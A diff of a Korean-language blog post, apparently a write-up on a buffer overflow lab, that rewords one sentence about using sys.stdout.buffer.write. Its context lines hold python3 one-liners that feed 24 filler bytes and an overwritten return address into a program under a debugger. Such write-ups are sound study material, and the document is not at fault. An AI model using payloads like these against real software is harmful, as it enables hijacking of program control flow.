@@ -50,7 +50,7 @@ r <<< $(python3 -c 'print("A"*24 + "\x96\x11\x40\x00")')
 
 ### 마지막 결과
 
-마지막은 이전에 참고한 글을 참고하여 `std.stdout.buffer.write`를 사용한 결과 깔끔하게 값이 출력되는 것을 확인할 수 있었다.
+마지막은 이전에 참고한 글처럼 `std.stdout.buffer.write`를 사용한 결과 깔끔하게 값이 출력되는 것을 확인할 수 있었다.
 
 ```console
 r <<< $(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*24 + b"\x96\x11\x40\x00\x00\x00\x00\x00")')
